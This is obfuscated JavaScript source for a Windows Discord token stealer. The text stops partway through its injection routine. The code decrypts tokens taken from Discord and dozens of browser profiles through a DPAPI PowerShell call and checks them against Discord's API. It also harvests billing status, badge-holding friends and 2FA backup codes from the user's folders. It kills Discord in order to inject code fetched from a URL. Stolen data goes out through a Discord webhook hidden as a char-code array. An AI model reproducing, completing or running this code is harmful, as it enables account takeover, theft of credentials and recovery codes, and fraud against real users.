const os = require("os");
const fs = require("fs");
const path = require("path");
const {
  execSync,
  exec,
  spawn,
  execFile
} = require("child_process");
const https = require("https");
const crypto = require("crypto");
const axios = require("axios");
const FormData = require("form-data");
const AdmZip = require("adm-zip");
const archiver = require("archiver");
const util = require("util");
const execAsync = util.promisify(exec);
const LOCAL = process.env.LOCALAPPDATA;
const ROAMING = process.env.APPDATA;
const _0x1 = "discord";
const _0x2 = _0x1 + "canary";
const _0x3 = _0x1 + "ptb";
const PATHS = {
  Discord: path.join(ROAMING, _0x1),
  "Discord Canary": path.join(ROAMING, _0x2),
  "Discord PTB": path.join(ROAMING, _0x3),
  Lightcord: path.join(ROAMING, "Light" + _0x1),
  Brave: path.join(LOCAL, "BraveSoftware", "Brave-Browser", ["User", " ", "Data"].join("")),
  "Brave Beta": path.join(LOCAL, "BraveSoftware", "Brave-Browser-Beta", ["User", " ", "Data"].join("")),
  "Brave Dev": path.join(LOCAL, "BraveSoftware", "Brave-Browser-Dev", ["User", " ", "Data"].join("")),
  "Brave Nightly": path.join(LOCAL, "BraveSoftware", "Brave-Browser-Nightly", ["User", " ", "Data"].join("")),
  Chrome: path.join(LOCAL, "Google", "Chrome", ["User", " ", "Data"].join("")),
  "Chrome Beta": path.join(LOCAL, "Google", "Chrome Beta", ["User", " ", "Data"].join("")),
  "Chrome Dev": path.join(LOCAL, "Google", "Chrome Dev", ["User", " ", "Data"].join("")),
  "Chrome Canary": path.join(LOCAL, "Google", "Chrome SxS", ["User", " ", "Data"].join("")),
  "Chrome SxS": path.join(LOCAL, "Google", "Chrome SxS", ["User", " ", "Data"].join("")),
  Edge: path.join(LOCAL, "Microsoft", "Edge", ["User", " ", "Data"].join("")),
  "Edge Beta": path.join(LOCAL, "Microsoft", "Edge Beta", ["User", " ", "Data"].join("")),
  "Edge Dev": path.join(LOCAL, "Microsoft", "Edge Dev", ["User", " ", "Data"].join("")),
  "Edge Canary": path.join(LOCAL, "Microsoft", "Edge Canary", ["User", " ", "Data"].join("")),
  Opera: path.join(ROAMING, "Opera Software", "Opera Stable"),
  "Opera GX": path.join(ROAMING, "Opera Software", "Opera GX Stable"),
  "Opera Beta": path.join(ROAMING, "Opera Software", "Opera Beta"),
  "Opera Developer": path.join(ROAMING, "Opera Software", "Opera Developer"),
  Vivaldi: path.join(LOCAL, "Vivaldi", ["User", " ", "Data"].join("")),
  Yandex: path.join(LOCAL, "Yandex", "YandexBrowser", ["User", " ", "Data"].join("")),
  Firefox: path.join(ROAMING, "Mozilla", "Firefox", "Profiles"),
  "Firefox ESR": path.join(ROAMING, "Mozilla", "Firefox ESR", "Profiles"),
  "Tor Browser": path.join(ROAMING, "Tor Browser", "Browser", "TorBrowser", "Data", "Browser", "profile.default"),
  Arc: path.join(LOCAL, "The Browser Company", "Arc", ["User", " ", "Data"].join("")),
  Sidekick: path.join(LOCAL, "Mecha", "Sidekick", ["User", " ", "Data"].join("")),
  Slimjet: path.join(LOCAL, "Slimjet", ["User", " ", "Data"].join("")),
  "SRWare Iron": path.join(LOCAL, "SRWare Iron", ["User", " ", "Data"].join("")),
  "Comodo Dragon": path.join(LOCAL, "Comodo", "Dragon", ["User", " ", "Data"].join("")),
  "Epic Privacy Browser": path.join(LOCAL, "Epic Privacy Browser", ["User", " ", "Data"].join("")),
  "Coc Coc": path.join(LOCAL, "Coc Coc", "Browser", ["User", " ", "Data"].join("")),
  "Cent Browser": path.join(LOCAL, "CentBrowser", ["User", " ", "Data"].join("")),
  "7Star": path.join(LOCAL, "7Star", "7Star", ["User", " ", "Data"].join("")),
  Amigo: path.join(LOCAL, "Amigo", ["User", " ", "Data"].join("")),
  Torch: path.join(LOCAL, "Torch", ["User", " ", "Data"].join("")),
  "Sogou Explorer": path.join(LOCAL, "SogouExplorer", "Webkit", "Default"),
  "UC Browser": path.join(LOCAL, "UCBrowser", "User Data Default"),
  "QIP Surf": path.join(LOCAL, "QIP Surf", ["User", " ", "Data"].join("")),
  RockMelt: path.join(LOCAL, "RockMelt", ["User", " ", "Data"].join("")),
  Flock: path.join(LOCAL, "Flock", "Browser", ["User", " ", "Data"].join("")),
  Bowser: path.join(LOCAL, "Bowser", ["User", " ", "Data"].join("")),
  "Pale Moon": path.join(ROAMING, "Moonchild Productions", "Pale Moon", "Profiles"),
  Waterfox: path.join(ROAMING, "Waterfox", "Profiles"),
  Cyberfox: path.join(ROAMING, "8pecxstudios", "Cyberfox", "Profiles"),
  SeaMonkey: path.join(ROAMING, "SeaMonkey", "Profiles"),
  IceDragon: path.join(ROAMING, "Comodo", "IceDragon", "Profiles"),
  "K-Meleon": path.join(ROAMING, "K-Meleon", "Profiles"),
  Basilisk: path.join(ROAMING, "Moonchild Productions", "Basilisk", "Profiles"),
  Safari: path.join(ROAMING, "Apple Computer", "Safari")
};
const _0x4a8f = [104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 52, 57, 56, 48, 52, 57, 48, 55, 54, 51, 52, 54, 55, 52, 57, 49, 49, 57, 47, 103, 116, 86, 51, 99, 110, 67, 113, 110, 53, 120, 73, 112, 74, 101, 83, 74, 115, 66, 65, 100, 71, 52, 54, 73, 72, 119, 89, 98, 85, 99, 120, 82, 79, 49, 117, 83, 108, 65, 114, 79, 57, 99, 51, 101, 73, 86, 111, 79, 87, 74, 107, 95, 45, 57, 110, 113, 84, 116, 117, 53, 88, 86, 87, 108, 45, 114, 76];
const _0x9b2c = {
  _0x1d: _0x2f6455 => {
    let _0x17cbad = "";
    for (let _0x1047b7 = 0; _0x1047b7 < _0x2f6455.length; _0x1047b7++) {
      _0x17cbad += String.fromCharCode(_0x2f6455[_0x1047b7] ^ (_0x1047b7 * 7 + 13) % 256);
    }
    return _0x17cbad;
  },
  _0x2e: _0x5df192 => {
    let _0x484645 = "";
    for (let _0x19b07b = 0; _0x19b07b < _0x5df192.length; _0x19b07b++) {
      _0x484645 += String.fromCharCode(_0x5df192[_0x19b07b]);
    }
    return _0x484645;
  }
};
const CONFIG = {
  webhook: _0x9b2c._0x2e(_0x4a8f), // deleted :p
  logMethod: "discord",
  telegram: {
    token: "",
    chatId: ""
  },
  userId: "",
  apiUrl: ""
};
if (CONFIG.webhook && CONFIG.webhook !== "WEBHOOK_URL_PLACEHOLDER" && !CONFIG.webhook.startsWith("http")) {
  try {
    CONFIG.webhook = Buffer.from(CONFIG.webhook.split("").reverse().join(""), "base64").toString("utf-8");
  } catch (a0_0x59aca6) {}
}
const SKIBIDI_INJ = "local";
const ENABLE_ANTIVM = true;
function globalLog(_0x41f0f7) {}
globalLog("Main.js loaded/required");
function dpapiUnprotectWithPowerShell(_0x278422) {
  try {
    const _0x410174 = Buffer.isBuffer(_0x278422) ? _0x278422.toString("base64") : Buffer.from(_0x278422).toString("base64");
    const _0x41f316 = "Add-Type -AssemblyName System.Security;$b=[Convert]::FromBase64String('" + _0x410174 + "');$p=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[Console]::Out.Write([Convert]::ToBase64String($p))";
    const _0x3ec85c = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"" + _0x41f316 + "\"";
    const _0x4eca71 = execSync(_0x3ec85c, {
      encoding: "utf8"
    }).trim();
    if (!_0x4eca71) {
      return null;
    }
    return Buffer.from(_0x4eca71, "base64");
  } catch (_0x4d5c87) {
    return null;
  }
}
const dpapi = {
  unprotectData: _0x41d929 => {
    const _0x112dc7 = dpapiUnprotectWithPowerShell(_0x41d929);
    if (!_0x112dc7) {
      throw new Error(["D", "P", "A", "P", "I", " ", "P", "o", "w", "e", "r", "S", "h", "e", "l", "l", " ", "f", "a", "l", "l", "b", "a", "c", "k", " ", "f", "a", "i", "l", "e", "d"].join(""));
    }
    return _0x112dc7;
  }
};
function decryptToken(_0x370b51, _0x508a79) {
  try {
    const _0x3cb783 = _0x370b51.split(["d", "Qw4", "w9W", "gXc", "Q:"].join(""));
    if (_0x3cb783.length !== 2) {
      return null;
    }
    const _0x5d1387 = Buffer.from(_0x3cb783[1], "base64");
    const _0x11e690 = _0x5d1387.slice(3, 15);
    const _0x3883ad = _0x5d1387.slice(15, -16);
    const _0x3d6980 = _0x5d1387.slice(-16);
    const _0x5ab0e3 = crypto.createDecipheriv("aes-256-gcm", _0x508a79, _0x11e690);
    _0x5ab0e3.setAuthTag(_0x3d6980);
    let _0x569eae = _0x5ab0e3.update(_0x3883ad);
    _0x5ab0e3.final();
    return _0x569eae.toString("utf8").replace(/\0/g, "").trim();
  } catch (_0x2f8a03) {
    return null;
  }
}
function getEncryptionKey(_0x340f71) {
  const _0x2032ec = path.join(_0x340f71, ["L", "o", "c", "a", "l", " ", "S", "t", "a", "t", "e"].join(""));
  try {
    if (!fs.existsSync(_0x2032ec)) {
      return null;
    }
    const _0x2892f4 = JSON.parse(fs.readFileSync(_0x2032ec, "utf8"));
    const _0x478a75 = _0x2892f4[["o", "s", "_", "c", "r", "y", "p", "t"].join("")]?.[["e", "n", "c", "r", "y", "p", "t", "e", "d", "_", "k", "e", "y"].join("")];
    if (!_0x478a75) {
      return null;
    }
    const _0x3dc550 = Buffer.from(_0x478a75, "base64");
    if (_0x3dc550.slice(0, 5).toString() !== ["D", "P", "A", "P", "I"].join("")) {
      return null;
    }
    const _0x4af562 = _0x3dc550.slice(5);
    try {
      const _0x1765e8 = dpapi.unprotectData(_0x4af562, null, "CurrentUser");
      return Buffer.from(_0x1765e8);
    } catch (_0x1d84bf) {
      return null;
    }
  } catch (_0xb23795) {
    return null;
  }
}
function findLevelDBPaths(_0x135647) {
  const _0x11b7e1 = [];
  try {
    const _0x389167 = fs.readdirSync(_0x135647, {
      withFileTypes: true
    });
    for (const _0xf712f9 of _0x389167) {
      if (_0xf712f9.isDirectory()) {
        const _0xe25c2 = path.join(_0x135647, _0xf712f9.name);
        if (_0xf712f9.name === ["L", "o", "c", "a", "l", " ", "S", "t", "o", "r", "a", "g", "e"].join("") || _0xf712f9.name === ["S", "e", "s", "s", "i", "o", "n", " ", "S", "t", "o", "r", "a", "g", "e"].join("")) {
          const _0x260390 = path.join(_0xe25c2, ["l", "e", "v", "e", "l", "d", "b"].join(""));
          if (fs.existsSync(_0x260390)) {
            _0x11b7e1.push(_0x260390);
          }
        }
        if (_0xf712f9.name.startsWith("Profile") || _0xf712f9.name === "Default") {
          const _0xc5d753 = findLevelDBPaths(_0xe25c2);
          _0x11b7e1.push(..._0xc5d753);
        }
      }
    }
  } catch (_0x4a0b00) {}
  return _0x11b7e1;
}
function safeStorageSteal(_0x474a8f, _0x186e35) {
  const _0x4ff55e = [];
  const _0x1bee9b = getEncryptionKey(_0x474a8f);
  if (!_0x1bee9b) {
    return _0x4ff55e;
  }
  const _0x47c886 = findLevelDBPaths(_0x474a8f);
  for (const _0x518887 of _0x47c886) {
    try {
      const _0x598524 = fs.readdirSync(_0x518887);
      for (const _0x3edbfc of _0x598524) {
        if (!_0x3edbfc.endsWith(".log") && !_0x3edbfc.endsWith(".ldb")) {
          continue;
        }
        const _0x2ab414 = path.join(_0x518887, _0x3edbfc);
        try {
          const _0x122793 = fs.readFileSync(_0x2ab414, "utf8");
          const _0x33906f = _0x122793.split("\n");
          for (const _0x2c0fd4 of _0x33906f) {
            if (_0x2c0fd4.trim()) {
              const _0x205402 = _0x2c0fd4.match(new RegExp(["d", "Qw4", "w9W", "gXc", "Q:[^\"\\s]+"].join(""), "g"));
              if (_0x205402) {
                for (let _0x3b96d7 of _0x205402) {
                  _0x3b96d7 = _0x3b96d7.replace(/\\$/, "");
                  const _0x31634a = decryptToken(_0x3b96d7, _0x1bee9b);
                  if (_0x31634a && !_0x4ff55e.some(_0x55bc31 => _0x55bc31[0] === _0x31634a && _0x55bc31[1] === _0x186e35)) {
                    _0x4ff55e.push([_0x31634a, _0x186e35]);
                  }
                }
              }
            }
          }
        } catch (_0x170ebd) {}
      }
    } catch (_0x8bc870) {}
  }
  return _0x4ff55e;
}
function simpleSteal(_0x22f7f7, _0x38ffb2) {
  const _0x451956 = [];
  const _0x2af2a4 = findLevelDBPaths(_0x22f7f7);
  for (const _0x425e3c of _0x2af2a4) {
    try {
      const _0x537b17 = fs.readdirSync(_0x425e3c);
      for (const _0x58dec2 of _0x537b17) {
        if (!_0x58dec2.endsWith(".log") && !_0x58dec2.endsWith(".ldb")) {
          continue;
        }
        const _0x537a99 = path.join(_0x425e3c, _0x58dec2);
        try {
          const _0x4d5f20 = fs.readFileSync(_0x537a99, "utf8");
          const _0x4b1f30 = _0x4d5f20.split("\n");
          for (const _0x7f5c48 of _0x4b1f30) {
            if (_0x7f5c48.trim()) {
              const _0x33abae = _0x7f5c48.match(new RegExp("[\\w-]{24,27}\\.[\\w-]{6,7}\\.[\\w-]{25,110}", "g"));
              if (_0x33abae) {
                for (const _0x6687b5 of _0x33abae) {
                  if (!_0x451956.some(_0x4f4523 => _0x4f4523[0] === _0x6687b5 && _0x4f4523[1] === _0x38ffb2)) {
                    _0x451956.push([_0x6687b5, _0x38ffb2]);
                  }
                }
              }
            }
          }
        } catch (_0x5dd77a) {}
      }
    } catch (_0x578314) {}
  }
  return _0x451956;
}
function getTokens(_0x12d8ae, _0x5f5ab1) {
  let _0x224790 = [];
  _0x224790 = safeStorageSteal(_0x5f5ab1, _0x12d8ae);
  if (_0x224790.length === 0) {
    _0x224790 = simpleSteal(_0x5f5ab1, _0x12d8ae);
  }
  return _0x224790;
}
const HQ_BADGES = [1, 2, 4, 8, 512, 16384, 131072, 262144];
async function getHQFriends(_0x519d77) {
  return new Promise(_0x433ac0 => {
    const _0x535fcf = {
      hostname: "discord.com",
      port: 443,
      path: "/api/v9/users/@me/relationships",
      method: "GET",
      headers: {}
    };
    _0x535fcf.headers.Authorization = _0x519d77;
    _0x535fcf.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    const _0x5f0a01 = _0x535fcf;
    const _0x26d15a = https.request(_0x5f0a01, _0x53188f => {
      let _0x2062ca = "";
      _0x53188f.on("data", _0x1f8720 => _0x2062ca += _0x1f8720);
      _0x53188f.on("end", () => {
        if (_0x53188f.statusCode === 200) {
          try {
            const _0x4fecbd = JSON.parse(_0x2062ca);
            const _0x4570f9 = _0x4fecbd.filter(_0x2ea07f => _0x2ea07f.type === 1);
            const _0x1fcfa0 = _0x4570f9.filter(_0x97da40 => {
              const _0x829767 = _0x97da40.user?.public_flags || 0;
              return HQ_BADGES.some(_0x3a02c9 => (_0x829767 & _0x3a02c9) !== 0);
            }).map(_0x2383b7 => ({
              username: _0x2383b7.user?.username || "Unknown",
              id: _0x2383b7.user?.id || "0",
              flags: _0x2383b7.user?.public_flags || 0
            }));
            const _0x373349 = {
              count: _0x1fcfa0.length,
              list: _0x1fcfa0
            };
            _0x433ac0({
              totalRelationships: _0x4fecbd.length,
              friends: {
                count: _0x4570f9.length,
                list: _0x4570f9.map(_0x51ab17 => ({
                  username: _0x51ab17.user?.username || "Unknown",
                  id: _0x51ab17.user?.id || "0",
                  discriminator: _0x51ab17.user?.discriminator || "0"
                }))
              },
              hqFriends: _0x373349
            });
          } catch (_0xbe799) {
            _0x433ac0({
              totalRelationships: 0,
              friends: {
                count: 0,
                list: []
              },
              hqFriends: {
                count: 0,
                list: []
              }
            });
          }
        } else {
          _0x433ac0({
            totalRelationships: 0,
            friends: {
              count: 0,
              list: []
            },
            hqFriends: {
              count: 0,
              list: []
            }
          });
        }
      });
    });
    const _0x22fbdb = {
      totalRelationships: 0,
      friends: {
        count: 0,
        list: []
      },
      hqFriends: {
        count: 0,
        list: []
      }
    };
    _0x26d15a.on("error", () => _0x433ac0(_0x22fbdb));
    _0x26d15a.setTimeout(2000, () => {
      _0x26d15a.destroy();
      _0x433ac0({
        totalRelationships: 0,
        friends: {
          count: 0,
          list: []
        },
        hqFriends: {
          count: 0,
          list: []
        }
      });
    });
    _0x26d15a.end();
  });
}
async function checkBilling(_0x2b3412) {
  return new Promise(_0x6b2b00 => {
    const _0x3cb700 = {
      hostname: "discord.com",
      port: 443,
      path: "/api/v9/users/@me/billing/payment-sources",
      method: "GET",
      headers: {}
    };
    _0x3cb700.headers.Authorization = _0x2b3412;
    _0x3cb700.headers["Content-Type"] = "application/json";
    _0x3cb700.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    const _0x35ba24 = _0x3cb700;
    const _0x1c9a36 = https.request(_0x35ba24, _0x14002a => {
      let _0x4d6491 = "";
      _0x14002a.on("data", _0x3a398e => _0x4d6491 += _0x3a398e);
      _0x14002a.on("end", () => {
        if (_0x14002a.statusCode === 200) {
          try {
            const _0x58f2df = JSON.parse(_0x4d6491);
            _0x6b2b00(Array.isArray(_0x58f2df) && _0x58f2df.length > 0);
          } catch (_0x120ee9) {
            _0x6b2b00(false);
          }
        } else {
          _0x6b2b00(false);
        }
      });
    });
    _0x1c9a36.on("error", () => _0x6b2b00(false));
    _0x1c9a36.setTimeout(2000, () => {
      _0x1c9a36.destroy();
      _0x6b2b00(false);
    });
    _0x1c9a36.end();
  });
}
async function validateToken(_0x4f13d2) {
  return new Promise(_0x325c5a => {
    if (!_0x4f13d2 || _0x4f13d2.length < 50) {
      return _0x325c5a({
        valid: false,
        reason: "Invalid token format"
      });
    }
    const _0xe882f0 = {
      Authorization: _0x4f13d2,
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    };
    const _0x1223fd = {
      hostname: "discord.com",
      port: 443,
      path: "/api/v9/users/@me",
      method: "GET",
      headers: _0xe882f0
    };
    const _0x22ce41 = _0x1223fd;
    const _0x3d04b4 = https.request(_0x22ce41, _0x8e678a => {
      let _0x506dc9 = "";
      _0x8e678a.on("data", _0x4ac75f => _0x506dc9 += _0x4ac75f);
      _0x8e678a.on("end", () => {
        if (_0x8e678a.statusCode === 200) {
          try {
            const _0x8aa246 = JSON.parse(_0x506dc9);
            const _0x23297a = _0x8aa246.id;
            const _0x3c7d = {
              hostname: "discord.com",
              port: 443,
              path: "/api/v9/users/" + _0x23297a + "/profile",
              method: "GET",
              headers: {}
            };
            _0x3c7d.headers.Authorization = _0x4f13d2;
            _0x3c7d.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
            const _0x241d8d = _0x3c7d;
            const _0x49bde8 = https.request(_0x241d8d, _0x5efcd9 => {
              let _0x3b78c2 = "";
              _0x5efcd9.on("data", _0x479c13 => _0x3b78c2 += _0x479c13);
              _0x5efcd9.on("end", () => {
                if (_0x5efcd9.statusCode === 200) {
                  try {
                    const _0x2c3bc9 = JSON.parse(_0x3b78c2);
                    const _0x2ec84f = {
                      ..._0x8aa246
                    };
                    _0x2ec84f.premium_type = _0x2c3bc9.premium_type;
                    _0x2ec84f.premium_since = _0x2c3bc9.premium_since;
                    _0x2ec84f.premium_guild_since = _0x2c3bc9.premium_guild_since;
                    _0x2ec84f.badges = _0x2c3bc9.badges;
                    _0x2ec84f.user_profile = _0x2c3bc9.user_profile;
                    const _0x3f7ca9 = _0x2ec84f;
                    if (_0x3f7ca9.id && _0x3f7ca9.username) {
                      const _0x561a21 = {
                        valid: true,
                        userInfo: _0x3f7ca9
                      };
                      _0x325c5a(_0x561a21);
                    } else {
                      _0x325c5a({
                        valid: false,
                        reason: "Invalid user data"
                      });
                    }
                  } catch (_0x2ccdc0) {
                    _0x325c5a({
                      valid: false,
                      reason: "Profile parse error"
                    });
                  }
                } else {
                  const _0x3d1b40 = {
                    valid: true,
                    userInfo: _0x8aa246
                  };
                  _0x325c5a(_0x3d1b40);
                }
              });
            });
            _0x49bde8.on("error", () => {
              const _0x13d331 = {
                valid: true,
                userInfo: _0x8aa246
              };
              _0x325c5a(_0x13d331);
            });
            _0x49bde8.setTimeout(5000, () => {
              _0x49bde8.destroy();
              const _0x3298c2 = {
                valid: true,
                userInfo: _0x8aa246
              };
              _0x325c5a(_0x3298c2);
            });
            _0x49bde8.end();
          } catch (_0x272201) {
            _0x325c5a({
              valid: false,
              reason: "Parse error"
            });
          }
        } else {
          const _0x4e435f = {
            valid: false,
            reason: "HTTP " + _0x8e678a.statusCode
          };
          _0x325c5a(_0x4e435f);
        }
      });
    });
    _0x3d04b4.on("error", _0x14858e => {
      const _0x1d8e25 = {
        valid: false,
        reason: _0x14858e.message
      };
      _0x325c5a(_0x1d8e25);
    });
    _0x3d04b4.setTimeout(5000, () => {
      _0x3d04b4.destroy();
      _0x325c5a({
        valid: false,
        reason: "timeout"
      });
    });
    _0x3d04b4.end();
  });
}
async function collectAllTokens(_0x204080) {
  const _0x4e1b8f = [];
  const _0x2cfcb2 = new Set();
  for (const [_0x3ced1a, _0x4c81bb] of Object.entries(PATHS)) {
    if (!fs.existsSync(_0x4c81bb)) {
      continue;
    }
    const _0xcca52 = getTokens(_0x3ced1a, _0x4c81bb);
    for (const [_0x3831f6, _0x52ed8f] of _0xcca52) {
      if (_0x2cfcb2.has(_0x3831f6)) {
        continue;
      }
      const _0x415258 = await validateToken(_0x3831f6);
      if (_0x415258.valid) {
        _0x2cfcb2.add(_0x3831f6);
        const _0x4aa49b = await checkBilling(_0x3831f6);
        const _0x3e4369 = await getHQFriends(_0x3831f6);
        _0x415258.userInfo.has_payment_methods = _0x4aa49b;
        _0x415258.userInfo.friendsCount = _0x3e4369.friends.count;
        _0x415258.userInfo.hqFriendsCount = _0x3e4369.hqFriends.count;
        _0x415258.userInfo.hqFriendsList = _0x3e4369.hqFriends.list;
        _0x4e1b8f.push([_0x3831f6, _0x52ed8f, _0x415258]);
      }
    }
  }
  if (_0x204080) {
    try {
      const _0x106bd0 = path.join(_0x204080, "Browser-Datas");
      if (fs.existsSync(_0x106bd0)) {
        const _0x58dd61 = fs.readdirSync(_0x106bd0);
        for (const _0x1cda76 of _0x58dd61) {
          if (_0x1cda76.endsWith("_tokens.txt")) {
            const _0x152bcf = _0x1cda76.replace("_tokens.txt", "");
            const _0x101ea5 = fs.readFileSync(path.join(_0x106bd0, _0x1cda76), "utf8");
            const _0x2ee071 = _0x101ea5.split(/\r?\n/).filter(_0x40725f => _0x40725f.trim().length > 0);
            for (const _0x17d83a of _0x2ee071) {
              if (_0x2cfcb2.has(_0x17d83a)) {
                continue;
              }
              const _0x33a157 = await validateToken(_0x17d83a);
              if (_0x33a157.valid) {
                _0x2cfcb2.add(_0x17d83a);
                const _0x351349 = await checkBilling(_0x17d83a);
                const _0x51c75b = await getHQFriends(_0x17d83a);
                _0x33a157.userInfo.has_payment_methods = _0x351349;
                _0x33a157.userInfo.friendsCount = _0x51c75b.friends.count;
                _0x33a157.userInfo.hqFriendsCount = _0x51c75b.hqFriends.count;
                _0x33a157.userInfo.hqFriendsList = _0x51c75b.hqFriends.list;
                _0x4e1b8f.push([_0x17d83a, _0x152bcf, _0x33a157]);
              }
            }
          }
        }
      }
    } catch (_0x296f48) {
      console.log("Error scanning Python tokens: " + _0x296f48.message);
    }
  }
  return _0x4e1b8f;
}
const BACKUP_CODE_PATTERN = /\*?\s*[a-z0-9]{4}-[a-z0-9]{4}/gi;
function isLikelyBackupCodeFile(_0x3a8825) {
  const _0x241d36 = _0x3a8825.toLowerCase();
  if (!_0x241d36.includes("discord")) {
    return false;
  }
  if (!_0x241d36.includes("backup") || !_0x241d36.includes("code")) {
    return false;
  }
  const _0x3b8f2f = _0x3a8825.match(BACKUP_CODE_PATTERN);
  if (!_0x3b8f2f || _0x3b8f2f.length < 8 || _0x3b8f2f.length > 15) {
    return false;
  }
  return true;
}
function extractBackupCodes(_0x1f39db) {
  const _0x141579 = [];
  const _0x47d1a7 = _0x1f39db.match(BACKUP_CODE_PATTERN);
  if (_0x47d1a7) {
    const _0x1feda4 = [...new Set(_0x47d1a7.map(_0x10f245 => _0x10f245.toLowerCase()))];
    _0x141579.push(..._0x1feda4);
  }
  return _0x141579;
}
function scanBackupDirectory(_0x43fb65, _0x29560a = [], _0x4b64d5 = 3, _0x41fb1f = 0) {
  try {
    if (_0x41fb1f >= _0x4b64d5) {
      return _0x29560a;
    }
    const _0x183e1f = fs.readdirSync(_0x43fb65, {
      withFileTypes: true
    });
    for (const _0x4aa916 of _0x183e1f) {
      try {
        const _0x31499b = path.join(_0x43fb65, _0x4aa916.name);
        if (_0x4aa916.isDirectory()) {
          const _0x4f7359 = _0x4aa916.name;
          if (_0x4f7359 === "Windows" || _0x4f7359 === "node_modules" || _0x4f7359 === "$Recycle.Bin" || _0x4f7359 === "System Volume Information" || _0x4f7359.startsWith(".")) {
            continue;
          }
          scanBackupDirectory(_0x31499b, _0x29560a, _0x4b64d5, _0x41fb1f + 1);
        } else if (_0x4aa916.name.endsWith(".txt")) {
          try {
            const _0x29defc = fs.readFileSync(_0x31499b, "utf-8");
            if (_0x29defc.includes("discord") || _0x29defc.includes("Discord")) {
              if (_0x29defc.includes("backup") || _0x29defc.includes("Backup")) {
                const _0x19bf08 = _0x29defc.match(BACKUP_CODE_PATTERN);
                if (_0x19bf08 && _0x19bf08.length >= 8 && _0x19bf08.length <= 15) {
                  const _0x4fd4f4 = [...new Set(_0x19bf08.map(_0x294d9c => _0x294d9c.toLowerCase()))];
                  const _0x4b2e96 = {
                    filePath: _0x31499b,
                    codes: _0x4fd4f4,
                    codeCount: _0x4fd4f4.length
                  };
                  _0x29560a.push(_0x4b2e96);
                }
              }
            }
          } catch (_0x3635b5) {}
        }
      } catch (_0x677718) {}
    }
  } catch (_0x3c8230) {}
  return _0x29560a;
}
async function findAllBackupCodes(_0x3ae1c2 = false) {
  const _0x25f8fc = [];
  try {
    const _0x5b7e01 = [path.join(os.homedir(), "Desktop"), path.join(os.homedir(), "Documents"), path.join(os.homedir(), "Downloads"), path.join(os.homedir(), "Videos"), path.join(os.homedir(), "Pictures"), path.join(os.homedir(), "Music")];
    for (const _0xda9756 of _0x5b7e01) {
      if (fs.existsSync(_0xda9756)) {
        scanBackupDirectory(_0xda9756, _0x25f8fc);
      }
    }
  } catch (_0xfcd1cb) {}
  return _0x25f8fc;
}
async function writeBackupCodesToFile(_0x4998f6) {
  try {
    const _0x9fc086 = await findAllBackupCodes(true);
    if (_0x9fc086.length === 0) {
      return null;
    }
    const _0x135766 = path.join(_0x4998f6, "backup-codes.txt");
    const _0x322c44 = [];
    _0x322c44.push("=".repeat(80));
    _0x322c44.push("Discord Backup Codes Found");
    _0x322c44.push("=".repeat(80));
    _0x322c44.push("");
    for (let _0x4fdc1d = 0; _0x4fdc1d < _0x9fc086.length; _0x4fdc1d++) {
      const _0x146a79 = _0x9fc086[_0x4fdc1d];
      _0x322c44.push("[" + (_0x4fdc1d + 1) + "] File: " + _0x146a79.filePath);
      _0x322c44.push("    Total Codes: " + _0x146a79.codeCount);
      _0x322c44.push("    Codes:");
      for (const _0x283815 of _0x146a79.codes) {
        _0x322c44.push("      • " + _0x283815);
      }
      _0x322c44.push("");
      _0x322c44.push("-".repeat(80));
      _0x322c44.push("");
    }
    _0x322c44.push("");
    _0x322c44.push("Total Files Found: " + _0x9fc086.length);
    _0x322c44.push("Total Unique Codes: " + _0x9fc086.reduce((_0x57b008, _0x344eb7) => _0x57b008 + _0x344eb7.codeCount, 0));
    fs.writeFileSync(_0x135766, _0x322c44.join("\n"), "utf-8");
    return _0x135766;
  } catch (_0x55c9da) {
    return null;
  }
}
const localappdata = process.env.LOCALAPPDATA;
const appData = process.env.APPDATA;
const injectionPaths = [];
const injectionResults = [];
async function killAndRestartDiscord() {
  return new Promise(_0x3e825a => {
    exec("tasklist", (_0x5729af, _0x1ae3ee) => {
      if (_0x5729af) {
        return _0x3e825a();
      }
      const _0x2156ae = ["Discord.exe", "DiscordCanary.exe", "DiscordDevelopment.exe", "DiscordPTB.exe"];
      const _0x3ed17d = [];
      for (const _0x2d470d of _0x2156ae) {
        if (_0x1ae3ee.includes(_0x2d470d)) {
          const _0x461468 = new Promise(_0x5c6189 => {
            exec("taskkill /F /T /IM " + _0x2d470d, _0x295e70 => {
              if (_0x295e70) {
                console.error("[Injection] Error killing " + _0x2d470d + ":", _0x295e70.message);
              } else {
                console.log("[Injection] Killed: " + _0x2d470d);
              }
              if (_0x2d470d.includes("Discord") && !_0x2d470d.includes("Development")) {
                const _0x40f4fa = _0x2d470d.replace(".exe", "");
                const _0xac4b95 = path.join(localappdata, _0x40f4fa, "Update.exe");
                if (fs.existsSync(_0xac4b95)) {
                  exec("\"" + _0xac4b95 + "\" --processStart " + _0x2d470d, _0x2796b5 => {
                    if (_0x2796b5) {
                      console.error("[Injection] Error restarting " + _0x2d470d + ":", _0x2796b5.message);
                    } else {
                      console.log("[Injection] Restarted: " + _0x2d470d);
                    }
                    _0x5c6189();
                  });
                } else {
                  _0x5c6189();
                }
              } else {
                _0x5c6189();
              }
            });
          });
          _0x3ed17d.push(_0x461468);
        }
      }
      Promise.all(_0x3ed17d).then(() => {
        console.log("[Injection] All Discord processes handled");
        _0x3e825a();
      });
    });
  });
}
async function fetchInjectionCode(_0x114432) {
  return new Promise((_0x502565, _0x5aec2e) => {
    https.get(_0x114432, _0x2723a1 => {
      let _0x20b729 = "";
      _0x2723a1.on("data", _0x41fd8d => _0x20b729 += _0x41fd8d);
      _0x2723a1.on("end", () => {
        if (_0x20b729 && _0x20b729.length > 100) {
          console.log("[Injection] Injection code fetched from URL");
          _0x502565(_0x20b729);
        } else {
          _0x5aec2e(new Error("Invalid injection code received"));
        }
      });
    }).on("error", _0x5aec2e);
  });
}
async function injectDiscordCore(_0x6d905d) {
  if (!localappdata || !appData) {
